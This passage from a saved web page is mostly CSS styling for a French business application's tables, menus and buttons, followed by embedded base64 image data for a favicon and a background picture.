              color: #586868;
            }
            select.ll_select  {
              color: #586868;
              font-size: 12px;
              width: 230px;
              height: 18px !important;
            }
            select.ll_select_small  {
              color: #586868;
              font-size: 12px;
              height: 18px !important;
              width: 70px;
            }
            textarea {
              border: solid #586868 1px;
              font-size: 12px;
              width: 700px;
              color: #586868;
              font-weight:bold;
              font: sans-serif !important;
            }
            textarea .contact {
            	width: 500px;
            }
            .cc, .cl, .cr, .tc, .tl, .tr, .fond_cc, .fond_cl, .fond_cr {
              font-size: 10px;
              text-transform: uppercase;
            }
            .fond_cc, .fond_cl, .fond_cr {
              background-color: #e8e8e9;
              padding: 2px;
            }
            .cc, .tc, .fond_cc, input.fond_cc {
            	text-align: center;
            }
            .cl, .tl, .fond_cl, input.fond_cl {
            	text-align: left;
            }
            .cr, .tr, .fond_cr, input.fond_cr, input.fond_cr_small {
            	text-align: right;
            }
            .cc, .cl, .cr {
              color: #586868;
            }
            .tc, .tr, .tl, .tic {
              background-color: #7cbb00;
              color: white !important;
            }
            /* ajout d'une class mini pour les trableaux trop gros */
            .cc_mini, .cl_mini, .cr_mini, .tc_mini, .tl_mini, .tr_mini, .fond_cc_mini, .fond_cl_mini, .fond_cr_mini {
              font-size: 9px;
              text-transform: uppercase;
            }
            .fond_cc_mini, .fond_cl_mini, .fond_cr_mini {
              background-color: #e8e8e9;
              padding: 2px;
            }
            .cc_mini, .tc_mini, .fond_cc_mini, input.fond_cc_mini {
            	text-align: center;
            }
            .cl_mini, .tl_mini, .fond_cl_mini, input.fond_cl_mini {
            	text-align: left;
            }
            .cr_mini, .tr_mini, .fond_cr_mini, input.fond_cr_mini, input.fond_cr_small_mini {
            	text-align: right;
            }
            .cc_mini, .cl_mini, .cr_mini {
              color: #586868;
            }
            .tc_mini, .tr_mini, .tl_mini, .tic_mini {
              background-color: #7cbb00;
              color: white !important;
            }

            .bouton_gris {
              background: /*savepage-url=/tra_cosmos_img/fond_bouton.jpg*/ var(--savepage-url-14);
              /* border: 1px #185E86 solid; */
              text-transform: uppercase;
              height: 20px !important;
              font-size: 10px;
              padding:6px;
              text-align: center;
              display:inline;
              font-style:normal;
            }
            a.bouton_gris {
              color: #ffffff;
            }
            a:HOVER.bouton_gris {
              color: #1A5E84;
              text-decoration:none !important;
            }
            .pln {
                font-size: 10px;
                text-transform: uppercase;
                background-color: #7cbb00;
                color: #FFFFFF;
            }
            .plb {
                font-size: 10px;
                text-transform: uppercase;
                background-color: #0091de;
                color: #FFFFFF;
            }

            .pldesactive {
            	font-size: 15px;
            	font-weight: bold;
            	float: left;
            }
            .titre_parenthese {
            	width: 650px;
            	height: 24px;
            }
            .titre_parenthese .titre  {
            	font-size: 15px;
            	font-weight: bold;
            	float: left;
            	padding-top: 3px;
            	text-transform: none;
            }
            .parenthese_ouvrante {
            	background-repeat: no-repeat;
            	height: 24px;
            	width: 10px;
            	float: left;
            	background-image: /*savepage-url=/tra_cosmos_img/parenthese_ouvrante_0015.jpg*/ url();
            }
            .parenthese_fermante {
            	float: left;
            	background-repeat: no-repeat;
            	height: 24px;
            	width: 10px;
            	background-image: /*savepage-url=/tra_cosmos_img/parenthese_fermante_0015.jpg*/ url();
            }
            .titre_parenthese_sur_2_cols {
            	width: 350x;
            	height: 24px;
            	font-size: 15px;
            }
            .titre_parenthese_sur_2_cols .titre{
            	font-size: 15px;
            	font-weight: bold;
            	float: left;
            	padding-top: 3px;
            	text-transform: none;
            }

            .titre_espace {
            	padding: 15px 0px 0px 14px;
            	font-size: 15px;
            	font-weight: bold;
            	text-transform: uppercase;
            	color: #7cbb00;
            }
            .titre_ident {
            	float: right;
            	padding: 0px 20px 3px 0px;
            	font-size: 25px;
            	font-weight: bold;
            	color: #0091de;
            }
            .titre_eve {
            	padding: 15px 0px 3px 10px;
            	font-size: 20px;
            	font-weight: bold;
            	color: #0091de;
            }
            .titre_sous_eve {
            /* bv 24/05/2012	font-weight: bold; */
            	font-size: 14px;
            	color: #0091de;
            	padding: 2px 0px 3px 0px;
            }
            .titre_sous_eve2 {
            	font-size: 13px;
            	color: #7CBB00;
            	padding: 5px 0px 3px 0px;
            }
            .titre_eve_erreur{
            	font-size: 14px;
            	font-weight: bold;
            }
            .blabla_home {
            	padding: 15px 0px 0px 10px;
            	font-family:Verdana, Arial, Helvetica, sans-serif;
            }
            .erreur {
            	padding: 15px 5px 15px 5px;
            	width: 800px;
            	font-size: 10px;
            	font-family: Verdana;
            	text-align: center;
            	border : solid 1px #586868;
            }

            ul.ll, ul.lldesactive, .ll ul {
            	list-style-type: square;
            	font-size: 11px;
            	font-style: normal;
            	padding-top: 2px;
            	padding-left: 15px;
            }
            .scroll_img {
            	height: 300px;
            	width: 780px;
            	overflow: scroll;
            }
            .titre_menu, td.titre_menu, .titre_menu_desactive {
            	color: #586868;
            	font-size: 16px;
            	padding-top: 15px;
            	padding-right: 5px;
            	padding-bottom: 5px;
            	padding-left: 0px;
            	font-weight: bold;
            	width: 390px;
            }
            .ll_menu, td.ll_menu {
            	font-size: 11px;
            	font-weight: bold;
            	font-style: normal;
            	width: 390px;
            	padding-left: 5px;
            }

            /* pour l'application GROUPE */
            .ci {
            	font-style: italic;
            }
            .tot {
            	font-size: 11px;
              text-align: right;
            }

            /* pour COPILOTE */
            .clairg {
              background-color: #ffffff !important;
              text-align: left;
            }
            .claird {
              background-color: #ffffff !important;
              text-align: right;
            }
            .fonceg {
              background-color: #e8e8e9 !important;
              text-align: left;
            }
            .fonced {
              background-color: #e8e8e9 !important;
              text-align: right;
            }
            .rar, .lr, .lr_small {
            	text-align: right;
            }
            /* fin */


            /* DataTables sorting */
            .sorting_asc {
            	cursor: pointer;
            	background-image : /*savepage-url=/tra_cosmos_img/croissant.gif*/ url() no-repeat center left;
            }
            .sorting_desc {
            	cursor: pointer;
            	background-image : /*savepage-url=/tra_cosmos_img/decroissant.gif*/ url() no-repeat center right;
            }
            .sorting {
            	cursor: pointer;
            }
            .sorting_asc_disabled {
            	background-image : /*savepage-url=/tra_cosmos_img/decroissant.gif*/ url() no-repeat center right;
            }
            .sorting_desc_disabled {
            	background-image : /*savepage-url=/tra_cosmos_img/croissant.gif*/ url() no-repeat center left;
            }

            .dataTables_filter {
              font-size: 11px;
              font: Arial, sans-serif;
              text-transform : uppercase;
            }
            .dataTables_paginate {
            	width: 44px;
            	float: right;
            	text-align: right;
            }
            .paging_full_numbers {
            	width: 300px;
            	height: 22px;
            	line-height: 22px;
            	cursor: hand;
            }
            .paging_full_numbers span.paginate_button, .paging_full_numbers span.paginate_active,
            .paging_full_numbers a.paginate_button, .paging_full_numbers a.paginate_active {
            	border: 1px solid #aaa;
            	padding: 2px 5px;
            	margin: 0 3px;
            }
            .paging_full_numbers a:active {
            	outline: none;
            }
            .paging_full_numbers a:hover {
            	text-decoration: none;
            }
            .paging_full_numbers span.paginate_button, .paging_full_numbers a.paginate_button {
            	background-color: #e8e8e9;
            	color: #aaa;
            }
            .paging_full_numbers a.paginate_button:hover, a.paginate_button:hover {
            	background-color: #7cbb00;
            	color: #ffffff;
            	text-decoration: none !important;
            }
            .paging_full_numbers span.paginate_active, .paging_full_numbers a.paginate_active {
            	background-color:#7cbb00;
            	color: #ffffff;
            }
            .paging_full_numbers a.paginate_button:hover {
            	background-color: #7cbb00;
            	color: #ffffff;
            	text-decoration: none !important;
            }

            .dataTables_info {
              font-size: 11px;
              font-weight:bold;
              font: Arial, sans-serif;
              display:inline;
            }

            .dataTables_wrapper{
            	padding-top: 1px;
            }

            /* DataTables Button */
            div.DTTT_container {
            	float: right;
            	margin-bottom: 1em;
            }
            button.DTTT_button {
            	position: relative;
              background-color:#a4a5a7 !important;
              color: #FFFFFF;
              cursor: pointer;
              text-transform: uppercase;
              height: 26px !important;
              font-size: 9px;
              padding:3px;
              font-family:Verdana, Arial, Helvetica, sans-serif;
              text-align: center;
              display:inline;
              font-style:bold;
              border: 1px #a4a5a7 solid;
              margin:2px;
            }
            button.DTTT_button::-moz-focus-inner {
            	border: none !important;
            	padding: 0;
            }
            button.DTTT_button_csv {
            	padding-right: 30px;
            	background: /*savepage-url=/tra_cosmos_js/DataTables-1.8.2/extras/TableTools/media/images/csv.png*/ url() no-repeat center right;
            }
            button.DTTT_button_csv_hover {
              color: #000000;
            	padding-right: 30px;
            	border: 1px solid #999;
            	background: #f0f0f0 /*savepage-url=/tra_cosmos_js/DataTables-1.8.2/extras/TableTools/media/images/csv_hover.png*/ url() no-repeat center right;
            }
            button.DTTT_button_pdf {
            	padding-right: 30px;
            	background: /*savepage-url=/tra_cosmos_js/DataTables-1.8.2/extras/TableTools/media/images/pdf.png*/ url() no-repeat center right;
            }
            button.DTTT_button_pdf_hover {
              color: #000000;
            	padding-right: 30px;
            	border: 1px solid #999;
            	background: #f0f0f0 /*savepage-url=/tra_cosmos_js/DataTables-1.8.2/extras/TableTools/media/images/pdf_hover.png*/ url() no-repeat center right;
            }
            button.DTTT_button_print {
            	padding-right: 30px;
            	background: /*savepage-url=/tra_cosmos_js/DataTables-1.8.2/extras/TableTools/media/images/print.png*/ url() no-repeat center right;
            }
            button.DTTT_button_print_hover {
              color: #000000;
            	padding-right: 30px;
            	border: 1px solid #999;
            	background: #f0f0f0 /*savepage-url=/tra_cosmos_js/DataTables-1.8.2/extras/TableTools/media/images/print_hover.png*/ url() no-repeat center right;
            }
            button.DTTT_button_collection {
            	padding-right: 17px;
            	background: /*savepage-url=/tra_cosmos_js/DataTables-1.8.2/extras/TableTools/media/images/collection.png*/ url() no-repeat center right;
            }
            button.DTTT_button_collection_hover {
              color: #000000;
            	padding-right: 17px;
            	border: 1px solid #999;
            	background: #f0f0f0 /*savepage-url=/tra_cosmos_js/DataTables-1.8.2/extras/TableTools/media/images/collection_hover.png*/ url() no-repeat center right;
            }

            div.DTTT_collection {
            	width: 150px;
            	padding: 3px;
            	border: 1px solid #ccc;
            	background-color: #f3f3f3;
            	overflow: hidden;
            	z-index: 2002;
            }
            div.DTTT_collection_background {
            	background: transparent /*savepage-url=/tra_cosmos_js/DataTables-1.8.2/extras/TableTools/media/images/background.png*/ url() repeat top left;
            	z-index: 2001;
            }
            div.DTTT_collection button.DTTT_button {
            	float: none;
            	width: 100%;
            	margin-bottom: 2px;
            	background-color: white;
            }

            .wait_page {
            	text-align: center;
            	vertical-align: middle;
            	font-family: Arial;
            	color: #586868;
            	text-transform: uppercase;
            	position: absolute;
            	top: 50%;
            	left: 50%;
            	margin-left: -88px;
            	font-size: 14px;
            }

            #dvProgress {
            	z-index : 10000;
            	background-color: white;
            	border : 1px solid;
            	padding : 3px;
            	position: absolute;
            	left: 45%;
            	width: 200px;
            	margin:0;
            }

            /* .ui-dialog{
            	position: absolute;
            	z-index: 10000;
            } */

            .ui-widget-overlay{
            	position: absolute; /* POUR TOUS LES VRAIS NAVIGATEURS */
            	top: 0;
            	left: 0;

            	position: relative\10; /* POUR IE 10 ET LES VERSIONS PRECEDENTES */

            }

            .ProfileTextSize{
            	font-size: 12px;
            }

            #ui-dialog-title-dialog-form{
            	font-size: 16px;
            }

            input.ll_inputProfile {
              font-style: normal !important;
            	height: 25px !important;
            	background-color: #ffffff;
            }
        </style>
        <style data-savepage-href="../../styles/style_menu_haut.css" type="text/css">
            /*******************************************/
            /*** CSS commun ࠬ'ensemble des sites *****/
            /*******************************************/

            .space_mh {
                padding-top: 3px;
            }
            .menu {
                left: 0px;
                top: 0px;
                width: 931px;
                height: 31px;
                clear: both;
            }
            .menu ul#ulnav {
                width: 930px;
                padding: 0;
                margin: 0 13px 0 13px;
                list-style: none;
            }
            .menu ul#ulnav li {
                padding: 0;
                margin: 0;
                float: left;
                display: inline;
            }
            .menu ul#ulnav li a {
                display: block;
                height: 31px;
            }
            .menu ul#ulnav li#item99 {
                width: 1px;
                height: 31px;
                background: url(/tra_cosmos_img/fond_menu_haut_separation.jpg) no-repeat;
            }
            .menu ul#ulnav li#item00 {
                height: 31px;
                width: 931px;
                background: url(/tra_cosmos_img/fond_menu_haut.jpg) repeat-x;
            }
            .menu ul#ulnav li#item98 {
                height: 31px;
                width: 550px;
                background: url(/tra_cosmos_img/fond_menu_haut.jpg) repeat-x;
            }
            .menu ul#ulnav li#rf_item98 {
                height: 31px;
                width: 360px;
                background: url(/tra_cosmos_img/fond_menu_haut.jpg) repeat-x;
            }
            .menu ul#ulnav li#df_item98 {
                height: 31px;
                width: 190px;
                background: url(/tra_cosmos_img/fond_menu_haut.jpg) repeat-x;
            }
            .menu ul#ulnav li#rf_item97 {
                height: 31px;
                width: 740px;
                background: url(/tra_cosmos_img/fond_menu_haut.jpg) repeat-x;
            }

            .menu ul#ulnav li#cop_item98 {
                height: 31px;
                width: 169px;
                background: url(/tra_cosmos_img/fond_menu_haut.jpg) repeat-x;
            }

            .menu ul#ulnav li#edivir_item98 {
                height: 31px;
                width: 360px;
                background: url(/tra_cosmos_img/fond_menu_haut.jpg) repeat-x;
            }

            .menu ul#ulnav li#item01,
            .menu ul#ulnav li#item02,
            .menu ul#ulnav li#item03,
            .menu ul#ulnav li#item04,
            .menu ul#ulnav li#item05,
            .menu ul#ulnav li#item06,
            .menu ul#ulnav li#item07,
            .menu ul#ulnav li#item08,
            .menu ul#ulnav li#item09,
            .menu ul#ulnav li#item10,
            .menu ul#ulnav li#rf_item01,
            .menu ul#ulnav li#rf_item02,
            .menu ul#ulnav li#rf_item03,
            .menu ul#ulnav li#cop_item98 {
                height: 31px;
                margin: 0px;
                list-style-type: none;
                position: relative;
            }
            .menu ul#ulnav li#item01 a,
            .menu ul#ulnav li#item02 a,
            .menu ul#ulnav li#item03 a,
            .menu ul#ulnav li#item04 a,
            .menu ul#ulnav li#item05 a,
            .menu ul#ulnav li#item06 a,
            .menu ul#ulnav li#item07 a,
            .menu ul#ulnav li#item08 a,
            .menu ul#ulnav li#item09 a,
            .menu ul#ulnav li#item10 a,
            .menu ul#ulnav li#rf_item01 a,
            .menu ul#ulnav li#rf_item02 a,
            .menu ul#ulnav li#rf_item03 a,
            .menu ul#ulnav li#cop_item98 a {
                height: 31px;
                font-size: 11px;
                text-transform: uppercase;
                text-decoration: none;
                text-align: center;
                color: #878787;
                background: url(/tra_cosmos_img/fond_menu_haut.jpg) repeat-x;
            }

            .menu ul#ulnav li#item01.pldesactive,
            .menu ul#ulnav li#item02.pldesactive,
            .menu ul#ulnav li#item03.pldesactive,
            .menu ul#ulnav li#item04.pldesactive,
            .menu ul#ulnav li#item05.pldesactive,
            .menu ul#ulnav li#item06.pldesactive,
            .menu ul#ulnav li#item07.pldesactive,
            .menu ul#ulnav li#item08.pldesactive,
            .menu ul#ulnav li#item09.pldesactive,
            .menu ul#ulnav li#item10.pldesactive,
            .menu ul#ulnav li#rf_item01.pldesactive,
            .menu ul#ulnav li#rf_item02.pldesactive,
            .menu ul#ulnav li#rf_item03.pldesactive,
            .menu ul#ulnav li#cop_item98.pldescative {
                height: 31px;
                font-size: 11px;
                text-transform: uppercase;
                text-decoration: none;
                text-align: center;
                color: #c0c0c0;
                background: url(/tra_cosmos_img/fond_menu_haut.jpg) repeat-x;
            }

            /********************************************/
            /*** CSS modifiable en fonction des sites ***/
            /********************************************/

            .menu ul#ulnav li#item01 a:hover,
            .menu ul#ulnav li#item01.selected a,
            .menu ul#ulnav li#item02 a:hover,
            .menu ul#ulnav li#item02.selected a,
            .menu ul#ulnav li#item03 a:hover,
            .menu ul#ulnav li#item03.selected a,
            .menu ul#ulnav li#item04 a:hover,
            .menu ul#ulnav li#item04.selected a,
            .menu ul#ulnav li#item05 a:hover,
            .menu ul#ulnav li#item05.selected a,
            .menu ul#ulnav li#item06 a:hover,
            .menu ul#ulnav li#item06.selected a,
            .menu ul#ulnav li#rf_item01 a:hover,
            .menu ul#ulnav li#rf_item01.selected a,
            .menu ul#ulnav li#rf_item02 a:hover,
            .menu ul#ulnav li#rf_item02.selected a,
            .menu ul#ulnav li#rf_item03 a:hover,
            .menu ul#ulnav li#rf_item03.selected a,
            .menu ul#ulnav li#cop_item98 a:hover,
            .menu ul#ulnav li#cop_item98.selected a {
                color: #7cbb00;
                background: /*savepage-url=/tra_cosmos_img/fond_menu_haut_color_0010.jpg*/ var(--savepage-url-11) repeat-x;
            }
            .menu ul#ulnav li#item01 a {
                width: 140px;
            }
            .menu ul#ulnav li#item02 a,
            .menu ul#ulnav li#item02.pldesactive {
                width: 140px;
            }
            .menu ul#ulnav li#item03 a,
            .menu ul#ulnav li#item03.pldesactive {
                width: 143px;
            }
            .menu ul#ulnav li#item04 a,
            .menu ul#ulnav li#item04.pldesactive {
                width: 148px;
            }
            .menu ul#ulnav li#item05 a {
                width: 180px;
            }
            .menu ul#ulnav li#item06 a {
                width: 174px;
            }
            .menu ul#ulnav li#rf_item01 a {
                width: 189px;
            }
            .menu ul#ulnav li#rf_item02 a,
            .menu ul#ulnav li#rf_item02.pldesactive {
                width: 189px;
            }
            .menu ul#ulnav li#rf_item03 a,
            .menu ul#ulnav li#rf_item03.pldesactive {
                width: 189px;
            }
        </style>
        <style data-savepage-href="../../styles/style_menu_ident.css" type="text/css">
            /***********************************/
            /*** CSS commun ࠴ous les sites ***/
            /***********************************/

            .menu_contact {
                float: right;
                right: 0px;
                top: 0px;
                width: 931px;
                clear: both;
            }
            .menu_contact ul#ulnavcont {
                width: 930px;
                padding: 0;
                margin: 2px 13px 0 13px;
                list-style: none;
            }
            .menu_contact ul#ulnavcont li {
                padding: 0;
                margin: 0;
                float: right;
                display: inline;
                height: 20px;
            }
            .menu_contact ul#ulnavcont li a {
                display: block;
            }
            .menu_contact ul#ulnavcont li#cont01,
            .menu_contact ul#ulnavcont li#cont02,
            .menu_contact ul#ulnavcont li#cont02BIG,
            .menu_contact ul#ulnavcont li#cont03,
            .menu_contact ul#ulnavcont li#cont03 a,
            .menu_contact ul#ulnavcont li#cont04,
            .menu_contact ul#ulnavcont li#cont05,
            .menu_contact ul#ulnavcont li#cont05 a {
                font-size: 9px;
                text-transform: uppercase;
                text-decoration: none;
                text-align: center;
                color: #878787;
            }

            .menu_contact ul#ulnavcont li#cont01 {
                width: 70px;
                padding-top: 4px;
            }
            .menu_contact ul#ulnavcont li#cont02 {
                width: 110px;
                padding-top: 4px;
            }
            .menu_contact ul#ulnavcont li#cont02BIG {
                width: 300px;
            }
            .menu_contact ul#ulnavcont li#cont03,
            .menu_contact ul#ulnavcont li#cont03 a {
                padding-top: 2px;
                width: 90px;
            }
            .menu_contact ul#ulnavcont li#cont03 a {
                color: #7cbb00;
            }
            .menu_contact ul#ulnavcont li#cont04 {
                width: 120px;
                padding-top: 4px;
            }
            .menu_contact ul#ulnavcont li#cont05 {
                width: 180px;
                padding-top: 4px;
            }

            .menu_contact ul ul {
                padding: 0px;
                display: none;
                margin: 0px;
                position: absolute;
            }
            /*
.menu_contact li:hover ul.subulcont {
		display: block;
		right: 0px; 
		top: 15px;
}
.menu_contact li.sfhover ul.subulcont {
		display: block;
		right: 0px; 
		top: 15px;
}
.menu_contact ul#ulnavcont li#cont03 ul.subulcont li a {
		color: #FFFFFF !important;
		width: 110px;
		background-image: none;
		background-color: #7bbc00;
		border-bottom: solid 1px #FFFFFF;
		height: 15px;
		padding-top: 3px;
}
.menu_contact ul#ulnavcont li#cont03 ul.subulcont li a:hover {
		color: #FFFFFF !important;
		width: 110px;
		background-image: none;
		background-color: #0091de;
		border-bottom: solid 1px #FFFFFF;
		height: 15px;
}*/
            .menu_contact #LayerIdent {
                position: absolute;
                z-index: 1;
                visibility: hidden;
                border: 2px solid #0091de;
            }

            /**********************************************************/
            /*** CSS ࠣopier dans style_color_metier.css si besoin ***/
            /**********************************************************/

            ul#ulnavcont ul.subulcont li a {
                background-color: #7cbb00;
                color: #ffffff;
            }
            ul#ulnavcont ul.subulcont li a:hover {
                color: #ffffff;
                background-color: #0091de;
            }
            .menu_contact ul#ulnavcont li#cont02BIG select.ll_select {
                color: #878787;
                font-size: 10px;
                width: 230px;
                height: 16px !important;
            }
        </style>
        <style data-savepage-href="../../styles/style_menu_gauche.css" type="text/css">
            /*******************************************/
            /*** CSS commun ࠬ'ensemble des sites *****/
            /*******************************************/

            .space_mg {
                padding: 3px 0px 3px 3px;
            }
            ul#menu_gauche {
                margin: 10px 0 0 13px;
                padding: 0;
                list-style: none;
                width: 105px;
            }
            ul#menu_gauche li {
                padding: 0px;
                margin: 3px 0px 0px 0px;
                float: left;
                display: inline;
                font-size: 10px;
                text-transform: uppercase;
            }
            ul#menu_gauche li#menug a {
                display: block;
                width: 105px;
                min-height: 18px;
                padding: 3px 1px 3px 2px;
            }
            ul#menu_gauche li#menug a:hover,
            ul#menu_gauche li#menug a.selected {
                width: 105px;
                min-height: 18px;
                text-transform: uppercase;
                text-decoration: none;
            }
            ul#menu_gauche li#menug a:hover,
            ul#menu_gauche li#menug .pldesactive {
                width: 105px;
                min-height: 18px;
                text-transform: uppercase;
                text-decoration: none;
            }
            ul#menu_gauche li#menug .pldesactive {
                color: #c0c0c0;
                padding: 3px 1px 3px 2px;
                font-size: 10px;
            }

            .menu_select {
                border: solid #586868 1px;
                font-size: 10px;
                width: 105px;
                height: 18px !important;
                color: #0091de;
                margin-bottom: 2px;
            }
            ul#menu_gauche li#sousmenug,
            ul#menu_gauche li#sousmenug a {
                margin: 0px;
                padding: 2px 2px 2px 0px;
                text-align: right;
                width: 103px;
            }
            ul#menu_gauche li#sousmenug a:hover,
            ul#menu_gauche li#sousmenug.selected a {
                text-decoration: underline;
            }

            /********************************************/
            /*** CSS modifiable en fonction des sites ***/
            /********************************************/

            ul#menu_gauche li {
                background-color: #0091de;
            }
            ul#menu_gauche li#menug a {
                background-color: #0091de;
                color: white;
            }
            ul#menu_gauche li#menug a:hover {
                color: #0091de;
                background-color: white !important;
            }
            ul#menu_gauche li#menug.selected a,
            ul#menu_gauche li#menug.selected a:hover {
                background-color: #0091de !important;
                color: white;
            }
            ul#menu_gauche li#menug.selected_blanc a,
            ul#menu_gauche li#menug.selected_blanc a:hover {
                background-color: white !important;
                color: #0091de !important;
            }
            ul#menu_gauche li#sousmenug,
            ul#menu_gauche li#sousmenug a {
                background-color: #d5ecf8;
                color: #0091de;
            }
        </style>
        <style data-savepage-href="../../styles/style_color_0001.css" type="text/css">
            TD.ll {
                text-align: left;
            }

            .minuscule {
                text-transform: lowercase;
                color: #0091de;
            }

            .tot {
                font-size: 12px;
            }

            .titre_camembert {
                text-align: left !important;
                padding-bottom: 10px;
                text-transform: uppercase;
                padding-left: 10px;
                padding-right: 10px;
                font-size: 10px;
                padding-top: 10px;
            }

            /*DIV.dataTables_wrapper {
	POSITION: relative; MIN-HEIGHT: 202px; ZOOM: 1; HEIGHT: 202px; CLEAR: both; PADDING-TOP: 1px
}*/
        </style>
        <!--[if lt IE 7]>
            <link href="/demo_site_web/fic_utilitaires/tra_cosmos_css/styleie6.css" rel="stylesheet" type="text/css" />
        <![endif]-->
        <!--[if gte IE 7]><LINK rel=stylesheet type=text/css href="../../styles/styleie7.css"><![endif]-->
        <script data-savepage-type="" type="text/plain" language="JavaScript"></script>

        <script data-savepage-type="" type="text/plain" language="JavaScript"></script>

        <meta name="GENERATOR" content="MSHTML 8.00.7601.17940" />
        <script language="javascript" data-savepage-type="text/javascript" type="text/plain" data-savepage-src="../../fic_utilitaires/S027_E001/S027_E001_script_cosmos_fr/traduction_fct.js"></script>
        <script data-savepage-type="" type="text/plain"></script>
        <link
            type="image/ico"
            rel="icon"
            data-savepage-href="favicon.ico"
            href="data:text/plain;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAFnRFWHRDcmVhdGlvbiBUaW1lADA0LzMwLzA51O4BBwAAAAd0SU1FB9kKEwc4KaGbNYUAAAAJcEhZcwAACxEAAAsRAX9kX5EAAAAEZ0FNQQAAsY8L/GEFAAAAllBMVEWJzrZxwKR6xKgKlmQAgUIAiUwAeDUAhEkgn3AAjlgeonVYtpMAfUAAklsrpHcAjFIAbyiZ08Ci1cIZnG3///+GzrSi28gAejw8rYUYoHFHso6y28wMj1k1rIQAczBsv6KIyK3D6Nvn9vGw28xfu51IrodnupgSk2ASnGsxo3ef18Mupnx/xqqu2sgAbSQAmWaV0b1PtJA4NP20AAAAo0lEQVR42lWP2RLCIAwAU02AWGjUovVqve/7/3/OYlHHfWHY2TABnueyIZ6Qk0RshUQCht0bMY/EauavcPvU+xUFwSHGc3Lx/nq7gxEZb3ervVaH4nhSri4E63a9Ycas1EHo+WKplHADZCJl1f687BxklIv93WthJ9OZOEdRgsGBHxZajcYcC+n2+px7H5OwmEbspJbiSLv+EREqJP0GIGn98QJgzg7jQVzWSwAAAABJRU5ErkJggg=="
        />
        <link rel="shurtcut icon" type="image/x-icon" data-savepage-href="favicon.ico" href="" />
        <style id="savepage-cssvariables">
            :root {
                --savepage-url-8: url(data:image/jpeg;base64,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